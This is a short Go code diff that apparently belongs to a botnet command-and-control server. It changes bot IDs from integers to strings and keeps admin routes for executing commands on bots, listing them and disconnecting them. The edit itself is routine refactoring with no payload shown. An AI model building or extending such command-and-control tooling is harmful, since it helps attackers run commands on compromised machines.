@@ -3,29 +3,28 @@ package main
 import (
 	"log"
 	"net/http"
-	"strconv"
 	"sync"
 )
 
 type c2 struct {
 	mu   sync.RWMutex
-	bots map[int]*Bot
+	bots map[string]*Bot
 }
 
 func Newc2() *c2 {
 	return &c2{
-		bots: make(map[int]*Bot),
+		bots: make(map[string]*Bot),
 	}
 }
 
-func (c *c2) registerBot(id int, b *Bot) {
+func (c *c2) registerBot(id string, b *Bot) {
 	c.mu.Lock()
 	defer c.mu.Unlock()
 
 	c.bots[id] = b
 }
 
-func (c *c2) getBot(id int) *Bot {
+func (c *c2) getBot(id string) *Bot {
 	c.mu.RLock()
 	defer c.mu.RUnlock()
 	return c.bots[id]
@@ -41,11 +40,12 @@ func main() {
 	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
 	adminMux.HandleFunc("/listBots", c2.ListBots)
 	adminMux.HandleFunc("/disconnect/{botid}/", func(w http.ResponseWriter, r *http.Request) {
-		botID, err := strconv.Atoi(r.PathValue("botid"))
-		if err != nil {
-			log.Println("Error converting botid type string to int", err)
-			return
-		}
+		// botID, err := strconv.Atoi(r.PathValue("botid"))
+		// if err != nil {
+		// 	log.Println("Error converting botid type string to int", err)
+		// 	return
+		// }
+		botID := r.PathValue("botid")
 
 		if exist := c2.DisconnectBot(botID); !exist {
 			log.Println("Bot with id : ", botID, " Does not exist.")
